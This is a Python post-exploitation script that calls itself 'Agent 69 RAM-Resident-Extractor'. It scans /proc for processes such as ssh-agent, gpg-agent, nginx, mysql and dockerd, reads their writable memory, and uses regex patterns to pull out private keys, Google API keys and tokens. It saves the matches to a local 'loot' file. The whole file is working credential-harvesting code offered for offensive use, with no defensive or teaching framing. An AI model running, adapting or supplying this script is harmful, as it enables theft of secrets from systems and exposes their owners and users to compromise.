#!/usr/bin/env python3
import os
import re
import sys

def extract_mem_strings():
    print("[*] [Agent 69] RAM-Resident-Extractor: Scanning process memory for secrets...")
    
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    loot_path = os.path.join(base_dir, "loot", "memory_secrets.txt")
    
    # We target high-value processes that handle credentials
    target_procs = ["ssh-agent", "gpg-agent", "apache2", "nginx", "mysql", "dockerd", "python3"]
    patterns = [
        b"-----BEGIN [A-Z ]+ PRIVATE KEY-----",
        b"AIza[A-Za-z0-9_\\-]{35}", # Google API Key
        b"token[\"']?\s*[:=]\s*[\"']?([A-Za-z0-9\-._~+/]{20,})", # Generic Token
    ]
    
    found_loot = []

    # Iterate through all PIDs in /proc
    for pid in [d for d in os.listdir('/proc') if d.isdigit()]:
        try:
            # Check the process name
            with open(f"/proc/{pid}/comm", "r") as f:
                comm = f.read().strip()
            
            if any(target in comm for target in target_procs):
                print(f"[+] Probing {comm} (PID: {pid})...")
                
                # 'maps' tells us which memory addresses are readable
                with open(f"/proc/{pid}/maps", "r") as maps:
                    for line in maps:
                        if "rw-p" in line: # Only scan Read/Write private memory
                            parts = line.split()
                            addr_range = parts[0].split("-")
                            start = int(addr_range[0], 16)
                            end = int(addr_range[1], 16)
                            
                            with open(f"/proc/{pid}/mem", "rb", 0) as mem:
                                mem.seek(start)
                                chunk = mem.read(end - start)
                                
                                for p in patterns:
                                    matches = re.findall(p, chunk)
                                    for m in matches:
                                        msg = f"[!] FOUND in {comm} ({pid}): {m.decode('utf-8', errors='ignore')}"
                                        print(msg)
                                        found_loot.append(msg)
        except (PermissionError, FileNotFoundError):
            continue
        except Exception as e:
            continue

    with open(loot_path, "w") as f:
        f.write("--- RAM Resident Secret Report ---\n")
        if found_loot:
            f.write("\n".join(set(found_loot)))
        else:
            f.write("No secrets found in targeted process memory.")

    print(f"[*] Memory extraction complete. Results saved to {loot_path}")

if __name__ == "__main__":
    # Local execution for post-exploitation data mining
    extract_mem_strings()
